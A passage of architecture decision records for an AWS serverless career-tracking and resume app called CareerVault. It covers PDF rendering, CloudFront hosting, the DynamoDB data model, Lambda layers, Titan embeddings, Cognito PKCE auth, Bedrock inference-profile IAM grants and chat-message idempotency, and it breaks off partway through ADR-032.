- ✅ Native, ergonomic tool-use support — critical for the resume agent (FR-5.2 and ADR-010).
- ✅ Model swapping requires only a model-ID change.
- ✅ AWS is investing future developer-experience work in Converse.
- ⚠️ Converse doesn't yet support every model-specific exotic feature. Not relevant to our use cases.

---

## ADR-018: PDF rendering library — WeasyPrint

**Status:** Accepted
**Date:** 2026-06-03

### Context
Resume output (FR-5.3) must support both an in-app HTML preview and a downloadable PDF.

### Decision
Use WeasyPrint to render HTML+CSS templates to PDF. The same HTML template will drive both the in-app preview and the PDF export.

### Alternatives considered
- **WeasyPrint** — HTML+CSS to PDF. Excellent modern CSS support. Pulls in system dependencies (~40–60 MB Lambda layer).
- **ReportLab** — programmatic PDF API. Lightweight (~5 MB), no system deps. Requires hand-coding the resume layout in Python.

### Consequences
- ✅ Single source of truth for resume layout (HTML/CSS).
- ✅ Modern CSS available.
- ⚠️ Lambda layer must be built/sourced. Cold-start time increases marginally.

---

## ADR-019: Frontend hosting — S3 + CloudFront direct

**Status:** Accepted
**Date:** 2026-06-03

### Context
The React frontend needs a hosting target. AWS offers Amplify Hosting (managed) and direct S3 + CloudFront.

### Decision
Host the built React app in a private S3 bucket fronted by CloudFront, using Origin Access Control (OAC). ACM provisions the TLS certificate; Route 53 provides the custom domain. The entire setup lives in the SAM template. A CloudFront function (or custom error response) handles the SPA routing fallback.

### Amendment (2026-07-15, slice 4)
At implementation the custom-domain half of this decision was deferred. **MVP ships on the default `*.cloudfront.net` domain and its default CloudFront TLS certificate — no Route 53 hosted zone and no ACM certificate.** Rationale: the custom domain adds recurring cost (hosted zone) plus DNS/cert-validation setup for zero MVP functional benefit on a single-user app; the CloudFront default domain is HTTPS out of the box. The S3 + CloudFront + OAC + SPA-fallback core of the decision stands unchanged. Custom domain (Route 53 + ACM in us-east-1 + alias records + Cognito callback-URL updates) is a v1.x upgrade; revisit if the app is ever shared under a branded URL.

### Alternatives considered
- **AWS Amplify Hosting** — fully managed, but Git-build pipeline fragments the IaC story.
- **S3 + CloudFront direct** — more code; every piece is exposed and educational.

### Consequences
- ✅ All hosting infrastructure lives in the SAM template alongside the rest of the stack.
- ✅ Hands-on exposure to standard production patterns: CloudFront distributions, OAC, ACM, cache behaviours, SPA routing fallbacks.
- ✅ Pattern transfers directly to other clouds.
- ⚠️ Build/deploy pipeline must be set up by hand. Cache invalidation must be scripted.

---

## ADR-022: Per-entry-type metadata schemas

**Status:** Accepted
**Date:** 2026-06-05

### Context
The ENTRY entity has eight subtypes (JOB, PROJECT, MILESTONE, CERT, AWARD, EDUCATION, VOLUNTEER, HOBBY), each with different attribute requirements driven by what fields are needed to render that type of item on a resume. The data model needs to formalize what's required and optional per type, while keeping the database itself schemaless to allow future evolution.

This was flagged as Q-1 in requirements v0.3 and deferred to architecture phase.

### Decision
- All ENTRY items share a common attribute set: `PK`, `SK`, `entity_type`, `entry_type`, `entry_id`, `title`, `content`, `event_date`, `skills_tags`, `embedding`, `embedding_model`, `created_at`, `updated_at`.
- Each subtype adds type-specific attributes (full schema captured in architecture document section 2.7).
- Enforcement happens application-level via **Pydantic models** in the Python Lambda code, not at the database layer.
- DynamoDB remains schemaless — new attributes can be added in the future without table migrations.

### Alternatives considered
- **No schema at all** — anything goes, just store dicts. Rejected: agent quality depends on attribute reliability (e.g., `issuer` on CERT entries must be populated for the agent to match against JD requirements).
- **JSON Schema validation in DynamoDB** — DynamoDB doesn't natively support this; would require external validation anyway.
- **Single uniform attribute set across all types** — would require nullable everything; type-specific clarity is lost.

### Consequences
- ✅ Type safety at the API boundary; bugs caught before they hit DynamoDB.
- ✅ Future schema additions (e.g., `activities` on EDUCATION) require no migration.
- ✅ Pydantic models double as API request/response schemas — single source of truth.
- ⚠️ Pydantic model definitions become a maintenance surface; needs discipline to keep them aligned with documented schemas.
- ⚠️ Cross-Lambda consistency requires the schemas to live in the shared Lambda layer.

---

## ADR-026: Data model — entity types and PK/SK design

**Status:** Accepted
**Date:** 2026-06-05

### Context
Single-table DynamoDB design requires upfront decisions about what entity types exist, how their primary keys are structured, and how the 12 enumerated access patterns map to operations.

### Decision
**Four entity types:**
- `PROFILE` — singleton per user (user profile + settings combined)
- `ENTRY` — career and life events (8 subtypes per ADR-022)
- `GOAL` — forward-looking goals
- `CONVERSATION_MESSAGE` — chat session messages

**Composite primary key (PK + SK both strings):**

| Entity | PK | SK |
|---|---|---|
| Profile | `USER#<user_id>` | `PROFILE` |
| Entry | `USER#<user_id>` | `ENTRY#<entry_id>` |
| Goal | `USER#<user_id>` | `GOAL#<goal_id>` |
| Conversation message | `USER#<user_id>` | `CONVO#<session_id>#<message_id>` |

All generated IDs are ULIDs (timestamp-sortable, 26-char unique identifiers).

All twelve access patterns resolve to a single DynamoDB Get or Query operation. Filter/sort for AP-7/AP-8/AP-9 happens in Lambda over AP-10's full read result.

### Alternatives considered
- **Multiple entity types under one `ENTRY` umbrella** (the original simpler model) — rejected because activities (VOLUNTEER, HOBBY) added in design discussion don't fit "career entry" naming, and PROFILE/GOAL/CONVERSATION have meaningfully different lifecycles.
- **Multi-table design** — rejected per ADR-005.
- **UUID instead of ULID** — UUIDs (specifically v4) aren't time-sortable, which gives up natural chronological ordering of items sharing an SK prefix.

### Consequences
- ✅ Every access pattern is one DynamoDB operation. No Scans.
- ✅ Item collection (`USER#<user_id>`) lets a single Query fetch the entire user state.
- ✅ Schemaless additivity: new entity types slot in as new SK prefixes without migration.
- ✅ ULIDs give chronological sort for free where the SK is the only ordering signal.
- ⚠️ Common-attribute discipline needs to be enforced via shared code (the Lambda layer).
- ⚠️ The umbrella ENTRY type with 8 subtypes is a slight conceptual hack — alternative would be 8 top-level types, but that proliferates SK prefixes for marginal gain.

---

## ADR-027: Delete semantics — hard delete with UI confirm

**Status:** Accepted
**Date:** 2026-06-05

### Context
When a user deletes an entry (AP-6), the system can either physically remove the record (hard delete) or mark it deleted with a `deleted_at` timestamp (soft delete).

### Decision
Hard delete, with a UI confirmation dialog as the accidental-delete safety net.

### Alternatives considered
- **Soft delete** — sets `deleted_at`, filters every list query. Common production pattern.
- **Hard delete with no confirm** — fastest UX but real accidental-loss risk.

### Consequences
- ✅ Every list-style access pattern (AP-7, AP-8, AP-9, AP-10) stays filter-free — no `deleted_at IS NULL` clauses to maintain.
- ✅ Simpler index design (no need to keep deleted items out of GSIs).
- ✅ Right-to-erasure compliance is natural — when a future multi-tenant version honors deletion requests, the data is actually gone.
- ✅ UI confirm dialog catches the bulk of accidental deletions.
- ⚠️ No undo possible after confirmation. Acceptable for single-user personal data; would reconsider for multi-stakeholder scenarios (e.g., shared portfolios) where audit trails matter.
- ⚠️ Mistakes are irrecoverable — but rare with the confirm dialog.

---

## ADR-028: GSI strategy — none at MVP

**Status:** Accepted
**Date:** 2026-06-05

### Context
DynamoDB Global Secondary Indexes (GSIs) let queries use alternative keys. Several access patterns (AP-7 chronological, AP-8 by type, AP-9 by date range) could be implemented as direct GSI queries instead of filter/sort over a full read.

### Decision
No GSIs at MVP. AP-7, AP-8, and AP-9 are implemented as filter/sort over AP-10's full read.

### Alternatives considered
- **GSI1 sorted by `event_date`** — would make chronological pagination efficient. Rejected for MVP because corpus is small and the resume agent already reads all entries anyway.
- **GSI2 with `entry_type` in the PK** — would make by-type filtering a direct query. Rejected for the same reason: cheap in-Lambda filter at this scale.
- **GSI3 for sparse date-range queries** — same logic.

### Consequences
- ✅ No GSI write amplification (each GSI replicates every write to the base table).
- ✅ No extra index throughput costs.
- ✅ Simpler operational picture — one table to monitor.
- ⚠️ Read latency grows linearly with entry count. Acceptable up to ~thousands of entries.
- ⚠️ Will need to be revisited if (a) entry counts grow into the thousands AND (b) CloudWatch shows AP-7 latency degrading. Most likely first addition: GSI1 sorted on `event_date`.

---

## ADR-023: Lambda layer composition — two layers (shared + WeasyPrint)

**Status:** Accepted
**Date:** 2026-06-14

### Context
CareerVault has seven Lambda functions sharing significant common code: Pydantic models, Bedrock client wrappers, DynamoDB helpers, embedding helpers, observability helpers. WeasyPrint (per ADR-018) requires substantial system dependencies (Pango, Cairo, GDK-PixBuf, ~40-60 MB total) that only one Lambda (`resume_agent`) needs. The packaging question is how to bundle this shared code: inline in each function package, or use AWS Lambda Layers — and if layers, how many.

### Decision
**Two Lambda layers:**

1. **`careervault-shared`** — Python utilities, ~5–10 MB. Attached to every Lambda. Contains:
   - Pydantic models (entity schemas per Section 2.7, tool input schemas per Sections 3.1 + 3.2)
   - Bedrock client wrapper (Converse + InvokeModel, model routing per ADR-009, retry per NFR-3.3)
   - DynamoDB helpers (PK construction from JWT context, SK-prefix-scoped writes per Section 4.2.4, conditional-write patterns per Section 3.1.4)
   - Embedding helper (single + batch variants per Section 4.6.2)
   - Observability helpers built on `aws_lambda_powertools` with the field schema from Section 4.1.1
   - Built via SAM `BuildMethod: python3.13`

2. **`careervault-weasyprint`** — WeasyPrint package + system shared libraries, ~40–60 MB. Attached only to `resume_agent`. Built via SAM `BuildMethod: makefile` inside a Docker container matching Lambda's Amazon Linux 2023 runtime, bundling the system `.so` files for Pango/Cairo/GDK-PixBuf alongside the Python package.

Layer source lives under `backend/shared/` (for `careervault-shared`) and `infrastructure/weasyprint-layer/` (for `careervault-weasyprint`).

### Alternatives considered
- **Bundle shared dependencies in each function package.** Simpler conceptually but duplicates ~5–10 MB across seven Lambdas (35–70 MB of redundant download per cold start). Loses centralized version pinning for the shared code.
- **One combined layer (shared + WeasyPrint).** Every Lambda would pull 40–60 MB on cold start even if it doesn't render PDFs. Wasteful.
- **Use a public WeasyPrint layer (e.g., from the Klayers project).** Easier, but adds external maintenance dependency. Reserved as escape hatch if Docker-based build proves more painful than expected; first attempt is to build it ourselves.
- **Container-image Lambda for `resume_agent`** (Docker image instead of zip + layer). Would simplify WeasyPrint packaging via standard Dockerfile, but introduces a different deployment model from the other six Lambdas. Tabled — single deployment model is simpler at MVP.

### Consequences
- ✅ Centralized version control for shared code; updates land across all functions on next deploy.
- ✅ Smaller cold-start footprint for non-PDF Lambdas — they don't pull WeasyPrint they don't use.
- ✅ Educational value: hands-on with the SAM layer build process including Docker container builds for native dependencies — a transferable skill for any non-Python-pure dependency (CUDA-bound libs, headless Chrome, scientific stacks).
- ✅ Fallback path defined — switching to a public Klayers layer for WeasyPrint is a two-line SAM template change if the Docker build proves blocking.
- ⚠️ Layers add modest cold-start overhead — ~50–100 ms for `careervault-shared`, additional ~200–500 ms for `careervault-weasyprint` on `resume_agent` cold starts.
- ⚠️ Layer versions are immutable; downstream functions don't automatically pick up new versions — the SAM deployment pipeline handles this transparently, but it's a real characteristic worth knowing.
- ⚠️ Local development requires `sam build` to bundle the layer before `sam local invoke` works; direct `python handler.py` won't find layer-resident imports without a `PYTHONPATH` adjustment.

### Cross-cloud parallel
**Azure Functions** doesn't have a direct equivalent to Lambda layers — shared code typically lives in a private PyPI package or in a "Function App shared assets" pattern within a single Function App boundary. **GCP Cloud Functions** historically had no layer mechanism (each function was self-contained); **Cloud Run** uses Docker base images for shared dependencies, which is more flexible but heavier. AWS Lambda's layer model is the cleanest of the three for this use case, and worth appreciating on its own merits.

---

## ADR-024: Embedding generation path — sync in write path

**Status:** Accepted
**Date:** 2026-06-13

### Context
Per ADR-016, every entry needs a Titan embedding vector to support the resume agent's semantic retrieval. Per Section 2.9 of `careervault-architecture.md`, the embedding is stored as a DynamoDB List attribute on the entry item itself. The architectural question is *when* the Titan call happens relative to the entry write — synchronously inline with the writing Lambda's PutItem, or asynchronously via DynamoDB Streams triggering a separate embedding Lambda.

Section 2.9 originally pinned this as "synchronous for MVP" and flagged the async alternative for capture in this ADR. Section 3.1.3 and ADR-022 then took the sync commitment forward into the IAM design (`career_crud` and `resume_upload_parser` both carry `bedrock:InvokeModel` on the Titan ARN per Section 4.2.3) and into the failure-handling story.

### Decision
Synchronous embedding generation in the writing Lambda's path:
- `career_crud` calls Titan inline before its conditional PutItem, on every entry create or update.
- `resume_upload_parser` calls Titan inline for each parsed entry, using Titan v2's batch-input support to keep latency bounded on bulk uploads.

The async alternative (DynamoDB Streams → embedding Lambda → UpdateItem) is explicitly *not* implemented for MVP. It is documented in Section 4.6 of the architecture document as a future lever with three named upgrade triggers: embedding-model-swap backfill at non-trivial scale, multi-tenant write throughput that makes Titan latency a bottleneck, or the addition of a second embedding store (e.g., S3 Vectors) alongside DynamoDB.

### Alternatives considered
- **Async via DynamoDB Streams + dedicated embedding Lambda.** Better resilience and a natural backfill pathway, but introduces an eventual-consistency window where entries exist without embeddings (resume agent retrieval misses them), edit/update races during that window, and a second Lambda with its own IAM, DLQ, alarms, and observability footprint. The operational tax outweighs the resilience gain at single-user MVP scale.
- **Hybrid (sync attempt with async fallback on Titan failure).** Conceptually appealing — only pay the async tax when sync fails — but doubles the surface area to write, test, and reason about. Rejected as over-engineered for Titan's actual failure rate.

### Consequences
- ✅ Linear, debuggable write path — failures bubble up to the user immediately rather than landing in CloudWatch hours later.
- ✅ Entries are searchable on first read — no eventual-consistency window.
- ✅ Simpler IAM, no DynamoDB Streams configuration, no second Lambda to monitor.
- ✅ Embedding-model upgrades stay coupled to the writing Lambda's code, matching the IAM ARN-pinning discipline from Section 4.2.3.
- ✅ Switching to async later is a contained refactor — enable the Stream, add the Lambda, remove the inline Titan call. No data migration required.
- ⚠️ Write latency includes Titan latency (~200–500 ms per call). Well inside NFR-2.1's 5-second budget, but visible.
- ⚠️ Titan failures fail the user write. The retry UX from Section 3.1.6 covers this, but the failure mode is user-visible rather than silently recoverable.
- ⚠️ Embedding cost paid on failed writes (Titan invoked, PutItem fails) — fixed at ~$0.00002 per failure, well within tolerance.
- ⚠️ Embedding-model-swap backfill is a one-off manual operation rather than a natural stream-replay. Tolerable at MVP scale (Section 4.6.6); reconsider when scale crosses the upgrade trigger in Section 4.6.5(1).

### Cross-cloud parallel
The same decision frame applies to Azure (Cosmos DB Change Feed for async, inline `AzureOpenAIClient.GetEmbeddingsAsync` for sync) and GCP (Firestore Triggers for async, inline `aiplatform.TextEmbeddingModel.get_embeddings` for sync). The MVP recommendation is sync on every cloud; the upgrade triggers and target architecture are identical.

> **Edit-path note (slice 3, 2026-07-12).** This ADR commits `career_crud` to embedding on "every entry create *or update*." Slice 3 adds the update route (`PUT /entries/{id}`) and refines *when* the Titan call fires on update, rather than re-embedding unconditionally: the handler compares `embedding_input_text(updated_entry)` against the same projection of the stored entry, and **re-embeds only when that text differs** — otherwise it reuses the stored vector. Edits that touch only non-embedded fields (an event date, a boolean, a non-indexed note) skip Titan entirely: no cost, no latency, and the stored vector remains correct because none of its inputs changed. This is a refinement of the sync-write-path commitment, not a departure from it — when the embedded text *does* change, the re-embed is still synchronous and inline before the write, exactly as the create path embeds before its `PutItem`. (The update itself is a conditional full-item `PutItem` guarded by `attribute_exists(SK)`, not an `UpdateItem` — see the §2.5 / §4.2.3 slice-3 note in the architecture doc.) It also keeps the "embedding stays coupled to the writing Lambda's code" property intact.

> **Parser correction (slice 5, 2026-07-21 — ADR-035).** This ADR's Decision lists a second inline
> embedder: "`resume_upload_parser` calls Titan inline for each parsed entry, using Titan v2's
> batch-input support." **Both halves are now wrong.** (a) Titan v2 has *no* batch-input form — the
> v1.3 arch correction (§4.6.2) already established that `embed_many` is a client-side loop. (b) Per
> ADR-035, `resume_upload_parser` does **not** embed at all: it is a parse-only transform that
> returns candidates without vectors, and embedding happens once at confirm through `POST /entries`
> (`career_crud`) like every other entry. So there remains exactly **one** embedding site in the
> system — `career_crud`'s write path — and this ADR's sync-embed-at-write commitment is unchanged;
> only the mistaken claim that the *parser* is a second embedder is retracted. `resume_upload_parser`
> therefore carries a Bedrock grant for **Haiku** (parse), not Titan.

---

## ADR-025: Cognito user flow — hosted UI with OAuth2 Authorization Code + PKCE

**Status:** Accepted
**Date:** 2026-06-14

### Context
CareerVault uses Amazon Cognito User Pools for authentication per ADR-007. Cognito offers two distinct integration patterns for the frontend: **hosted UI**, where Cognito serves the login/signup/forgot-password pages and the app uses OAuth2 Authorization Code with PKCE for token exchange, and **SDK-driven**, where the React app implements its own auth forms using the Amplify Auth library or `amazon-cognito-identity-js`. The choice affects frontend complexity, the UX shape of the auth flow, the attack surface, and the path to adding social identity providers later.

### Decision
**Hosted UI** with the OAuth2 **Authorization Code + PKCE** flow. The React app redirects to the Cognito-hosted pages for login/signup/forgot-password; Cognito returns an authorization code via redirect; the app exchanges the code for JWT tokens at Cognito's token endpoint.

Sub-decisions settled together with the main one:

- **OAuth2 flow:** Authorization Code + PKCE (the modern best-practice flow for SPAs; implicit flow is deprecated).
- **Self-service signup:** Disabled at MVP. Per ADR-006 single-tenant, the one user is created administratively. Public signup remains a v1.x decision tied to multi-tenant readiness.
- **MFA:** Optional, per-user opt-in. Available in Cognito but not enforced.
- **Password policy:** Cognito's strong defaults — minimum 8 characters, requires uppercase, lowercase, digit, and symbol.
- **Access token TTL:** 60 minutes (Cognito default).
- **Refresh token TTL:** 30 days (Cognito default).
- **Custom domain:** None at MVP. The Cognito-provided domain (e.g., `careervault-prod.auth.us-east-1.amazoncognito.com`) is used directly. Custom domain via Route 53 + ACM is a v1.x improvement.
- **Social identity providers:** None at MVP. Hosted UI makes adding them later a configuration change in Cognito, not a code change in the app.

### Alternatives considered
- **SDK-driven (Amplify Auth or `amazon-cognito-identity-js`).** Custom React forms for login/signup/forgot-password, with the SDK handling Cognito API calls directly. Gives full UI control and avoids the redirect chrome of the hosted-UI flow. Rejected because the frontend work is real and doesn't buy anything an MVP needs at single-user scale, and because the redirect-based Authorization Code flow is the more portable knowledge — every federated-auth system on every cloud uses the same primitive.
- **No auth.** Already addressed and rejected in ADR-007.
- **Cognito Identity Pools** (separate from User Pools — for federating browser-side calls directly to AWS resources). Not applicable; we want the Lambda-as-IAM-principal model from Section 4.2.

### Consequences
- ✅ Zero login-UI code on the frontend. Frontend effort stays focused on the chat / dashboard / resume flows where CareerVault is actually interesting.
- ✅ Adding social identity providers (Google, GitHub, Apple) later is a configuration change in Cognito, not a code change in the app.
- ✅ Authorization Code + PKCE is universally portable across federated-auth systems — directly applicable to Azure Entra External ID and GCP Identity Platform when those projects come.
- ✅ The hosted UI is well-tested — same surface Cognito uses for AWS Console federation.
- ⚠️ Redirect-based flow means the user briefly leaves the SPA during login. UX is standard but not seamless.
- ⚠️ Branding is limited to CSS-level theming of the hosted pages. Full custom layout requires either a custom-domain Hosted UI v2 or a switch to SDK-driven flows.
- ⚠️ The hosted UI lives at a Cognito-provided domain until/unless a custom domain is set up — visible to the user during the login redirect.

### Cross-cloud parallel
The hosted-UI-with-Authorization-Code-PKCE pattern is the recommended default on every cloud: **Azure Entra ID External ID** (formerly B2C) provides hosted authorization endpoints using the same OAuth2 flow; **GCP Identity Platform** offers hosted sign-in pages via FirebaseUI for the comparable use case. The cloud-neutral primitive is OAuth2 Authorization Code with PKCE — the right thing to internalize regardless of which cloud is in the picture.

---

## ADR-029: Frontend auth integration library — react-oidc-context

**Status:** Accepted
**Date:** 2026-06-14

### Context
ADR-025 settled the *protocol*: Cognito Hosted UI with OAuth2 Authorization Code + PKCE. It deliberately did not pick the client-side library that drives that flow in the React SPA. The first vertical slice (auth + `GET /settings`) forces the choice, because the SPA needs something to build the authorize-redirect URL, perform the PKCE code/verifier dance, exchange the authorization code for tokens at Cognito's token endpoint, store and silently renew tokens, and expose auth state to React components.

### Decision
Use **`react-oidc-context`** (the React bindings) on top of **`oidc-client-ts`** (the underlying OIDC/OAuth2 client). The app wraps its tree in `<AuthProvider>` configured with the Cognito User Pool issuer as `authority`; library discovery (`/.well-known/openid-configuration`) resolves the authorize/token/jwks endpoints. PKCE is automatic for `response_type: "code"`. Components consume auth state via the `useAuth()` hook. Cognito has no OIDC end-session endpoint, so logout is a manual redirect to Cognito's `/logout` Hosted UI URL with a registered `logout_uri`.

### Alternatives considered
- **AWS Amplify Auth (`aws-amplify`).** The official AWS library; can drive the Hosted UI. Rejected as the primary because it is a heavier dependency that pulls in Amplify's broader conventions and config surface, and ADR-025 already rejected the Amplify *SDK-driven forms* path. For a Hosted-UI redirect flow, a standards-based OIDC client carries less weight and less AWS coupling.
- **Hand-rolled PKCE (~100 lines).** Build the authorize URL, handle the redirect, exchange the code at the token endpoint, store/refresh tokens manually. Maximally educational and zero auth dependencies, but it re-implements token storage, expiry, and silent renew — surface area that a well-tested library already covers correctly. Reserved as a learning exercise, not the production path.
- **`@cognito/...` / `amazon-cognito-identity-js` directly.** Lower-level Cognito SDK; oriented toward the SDK-driven (non-Hosted-UI) flow ADR-025 rejected.

### Consequences
- ✅ Standards-based OIDC — the knowledge and most of the config port directly to Azure Entra External ID and GCP Identity Platform, matching ADR-025's "portable primitive" framing.
- ✅ Token storage, expiry tracking, and silent renew are handled by the library rather than hand-maintained.
- ✅ Small dependency footprint relative to Amplify; no AWS-specific SDK lock-in in the auth layer.
- ⚠️ Cognito's non-standard logout (no RP-initiated end-session endpoint) requires a manual `/logout` redirect helper rather than the library's `signoutRedirect()`.
- ⚠️ The library is community-maintained (not AWS-official); pinned to a major version (`^3`) and revisited if Cognito's OIDC surface changes.

### Cross-cloud parallel
`oidc-client-ts` is provider-agnostic — the same library works unchanged against **Azure Entra External ID** and **GCP Identity Platform** by swapping only the `authority` and `client_id`. The React binding pattern (`AuthProvider` + a `useAuth` hook) has direct equivalents in MSAL React (`MsalProvider` + `useMsal`) and Firebase (`useAuthState`), so the architectural shape transfers even where the library does not.

---

## ADR-030: Environment-gated table protection + parameterized reserved concurrency

**Status:** Accepted
**Date:** 2026-06-15

### Context
The first live `sam deploy` of the dev stack surfaced two real-account frictions that the architecture's blanket settings (Sections 4.7.3 and 4.7.4) did not account for:

1. **DynamoDB Deletion Protection (§4.7.3) wedges dev rollbacks.** The settings Lambda's create failed (see point 2), so CloudFormation rolled the stack back — and could not delete the `CareerVaultTable` because Deletion Protection was enabled, leaving the stack stuck in `ROLLBACK_FAILED`. Recovery required manually disabling protection and deleting the table out-of-band. Every failed create/update during active dev iteration would repeat this.
2. **Reserved Concurrency (§4.7.4) is unusable on the default account limit.** Setting `ReservedConcurrentExecutions: 5` was rejected: *"decreases account's UnreservedConcurrentExecution below its minimum value of [10]."* New AWS accounts ship with a total concurrent-execution limit of 10, and Lambda refuses any reservation that would leave fewer than 10 unreserved — so no function can reserve any concurrency until a Service Quotas increase is granted.

Both of the architecture's original intents remain valid: protect irreplaceable career history (§4.7.3) and cap runaway Bedrock cost (§4.7.4). The issue is that both were expressed as unconditional values that don't hold across environments or account states.

### Decision
Express both as environment/parameter-gated values in the SAM template, preserving the production intent while unblocking dev:

- **Deletion Protection** is gated to **prod only** via a `IsProd` condition (`DeletionProtectionEnabled: !If [IsProd, true, false]`). PITR remains enabled in **all** environments — it is near-zero cost and, unlike Deletion Protection, does not block deletes, so it never wedges a rollback.
- **Reserved Concurrency** for `settings_lambda` becomes a template **parameter** (`SettingsReservedConcurrency`, default `-1`). `-1` omits the property entirely (via `!If ... !Ref AWS::NoValue`); a positive value applies it. Default-off keeps deploys working on the constrained account; once a concurrency-limit increase lands, the parameter is set to the intended cap (e.g. 5) with no template change.

### Alternatives considered
- **Keep Deletion Protection on everywhere; recover manually when rollbacks wedge.** Rejected — it makes the inner dev loop hostile, and dev data is throwaway, so the protection buys nothing there.
- **Drop reserved concurrency from the template entirely.** Rejected — it discards the §4.7.4 cost guard for prod. Parameterizing keeps the guard one config value away.
- **Request the Service Quotas increase first, keep `5` hard-coded.** Rejected as a blocker — the increase is asynchronous (support-gated) and shouldn't gate first deploys; the parameter lets the value land later without code changes.

### Consequences
- ✅ Dev deploys roll back cleanly (no stuck `ROLLBACK_FAILED` from a protected table).
- ✅ Prod still gets Deletion Protection on the table holding real career history.
- ✅ Deploys succeed on a default-limit account; the cost guard is re-enabled by setting one parameter after a quota increase.
- ✅ The pattern (env-conditioned protection, parameterized guardrails) extends to future functions' reserved-concurrency caps and to any other prod-only safety setting.
- ⚠️ Dev has **no** table Deletion Protection — acceptable because dev data is disposable, but worth remembering before pointing anything important at the dev table.
- ⚠️ Until the account's Lambda concurrency limit is raised, **no** function carries a reserved-concurrency cap; the $10/month billing alarms (§4.1.4) remain the backstop in the interim.

### Cross-cloud parallel
The "protect prod, stay nimble in dev" gating is universal: **Azure** uses resource locks (`CanNotDelete`) typically applied only to prod resource groups, and Cosmos DB throughput caps per environment; **GCP** uses `deletion_protection` on resources (e.g. Cloud SQL, BigQuery tables) and per-project quota. On every cloud, account/project-level concurrency and throughput quotas start conservative and are raised via a support/quota request — designing the guardrail as a parameter rather than a constant is the portable lesson.

---

## ADR-031: Bedrock invocation via cross-region inference profile (Haiku 4.5)

**Status:** Accepted
**Date:** 2026-06-16

### Context
Slice 2 (chat + entry ingestion) is the first code to actually call Bedrock, so the abstract "use Claude Haiku" of ADR-009 had to become a concrete, invokable model identifier. Probing the live account (`768396678224`, us-east-1) surfaced a constraint the architecture had not accounted for:

- **`anthropic.claude-haiku-4-5-20251001-v1:0` advertises `inferenceTypesSupported: ["INFERENCE_PROFILE"]` only** — it has **no `ON_DEMAND` support**. A `Converse`/`InvokeModel` call against the bare foundation-model ID is rejected; the model is reachable *only* through an inference profile. Two system-defined profiles are `ACTIVE`: `us.anthropic.claude-haiku-4-5-20251001-v1:0` (US cross-region) and `global.anthropic.claude-haiku-4-5-20251001-v1:0` (global).
- **`amazon.titan-embed-text-v2:0` is `ON_DEMAND`** — invoked by its bare model ID, no profile involved.

This collides with the IAM guidance in architecture §4.2.3 ("Pinning model versions"), which assumed every model is a single, version-pinned foundation-model ARN. A cross-region inference profile is a *different* resource type and fans the call out across multiple regions, each of which needs its own foundation-model permission.

### Decision
- **Invoke Claude Haiku 4.5 through the `us.` cross-region inference profile** (`us.anthropic.claude-haiku-4-5-20251001-v1:0`). The `modelId` passed to the Converse API is the inference-profile ID, not the bare foundation-model ID. The `global.` profile is rejected for MVP (see alternatives).
- **Invoke Titan Text Embeddings v2 by its bare model ID** (`amazon.titan-embed-text-v2:0`, `InvokeModel`) — unchanged from the architecture.
- **IAM for the Haiku-using Lambdas grants `bedrock:InvokeModel` on two resource shapes** (the Converse API authorizes against `bedrock:InvokeModel`; there is no distinct `bedrock:Converse` action):
  1. the inference-profile ARN: `arn:aws:bedrock:us-east-1:<account>:inference-profile/us.anthropic.claude-haiku-4-5-20251001-v1:0`, **and**
  2. the underlying foundation-model ARN in *every* region the `us.` profile can route to — `arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-haiku-4-5-20251001-v1:0`, plus the same for `us-east-2` and `us-west-2`.

  Both halves are required: the profile ARN authorizes the profile call, the regional foundation-model ARNs authorize the actual inference wherever capacity routes it. This **refines §4.2.3** — "version-pinned ARN" becomes "version-pinned profile ARN + the set of regional foundation-model ARNs it fronts" for any inference-profile-only model.
- **Model IDs stay in environment variables** (`BEDROCK_HAIKU_MODEL_ID`, `BEDROCK_TITAN_EMBED_MODEL_ID`), set in the SAM template, kept in lockstep with the IAM ARNs — consistent with the `bedrock_client` stub's stated design and §4.3.4.

### Alternatives considered
- **`global.` cross-region profile.** Best capacity/availability, but it can route inference to *any* AWS region, which (a) puts career-history text outside the US with no residency guarantee and (b) forces the foundation-model ARN grant to be effectively all-regions, widening the IAM blast radius. Rejected — single-user MVP has no availability problem that US-only routing doesn't already solve.
- **Pin to an older on-demand Haiku** (e.g. `anthropic.claude-3-5-haiku-20241022-v1:0`, which still offers `ON_DEMAND`) to dodge inference profiles entirely. Rejected — those models are `LEGACY` in this account, and deliberately picking a worse, soon-to-be-retired model to avoid a one-time IAM nuance is the wrong trade. Inference profiles are where Bedrock is heading; learning the pattern now is the point.
- **A self-defined (custom) inference profile** for fine-grained cost tagging. Useful at multi-tenant scale for per-tenant cost attribution; overkill for one user. The system-defined `us.` profile is sufficient. Revisit if cost-allocation-by-profile becomes a need.

### Consequences
- ✅ Uses the current-generation Haiku 4.5 the way Bedrock intends newer models to be called.
- ✅ US-only routing keeps data residency predictable and bounds the IAM grant to three named regions.
- ✅ The env-var + ARN-pinning discipline from §4.2.3 carries over intact — a model swap is still an IaC change (now: profile ID + the regional ARN set).
- ⚠️ IAM is wordier: one foundation-model ARN becomes three (one per US region) alongside the profile ARN. A future region-set change to the `us.` profile would require an IAM update — acceptable, and the right friction.
- ⚠️ Cross-region routing means a single request *may* execute in us-east-2 or us-west-2. Same per-token price as on-demand, but CloudWatch/Bedrock invocation logs for a call can land in a region other than us-east-1 — worth knowing when debugging.
- ⚠️ The `resume_agent` (Sonnet, future slice) will almost certainly hit the same inference-profile-only constraint; this ADR sets the precedent its IAM will follow.

### Cross-cloud parallel
The "logical model alias that fans out across regions for capacity" pattern recurs: **Azure OpenAI** uses *deployments* (and Global/Data-Zone Standard deployment types) that decouple the called name from the physical region; **GCP Vertex AI** offers global and multi-region endpoints for the same reason. On every cloud the portable lesson is identical — the thing you invoke is an indirection over physical model capacity, and your access policy has to authorize every place that indirection can land.

---

## ADR-032: Chat turn idempotency — client-supplied message ID

**Status:** Accepted
**Date:** 2026-07-10

### Context
`chat_lambda` persists the user's message *before* calling Bedrock (§3.1.1), so a failed inference never loses the user's input. The `message_id` in the SK (`CONVO#<session_id>#<message_id>`) is a **server-minted** ULID, minted fresh on every invocation — so when the client retries a failed turn, the same user message is persisted a second time under a new ULID. Two consequences:

1. Duplicate CONVO items for one logical message (cosmetic — unique keys, no write conflict).
2. Worse: the duplicate is **replayed into every later prompt** for that session, since history replay (`_to_converse_messages`) includes both copies. Duplicated turns skew the model's read of the conversation.

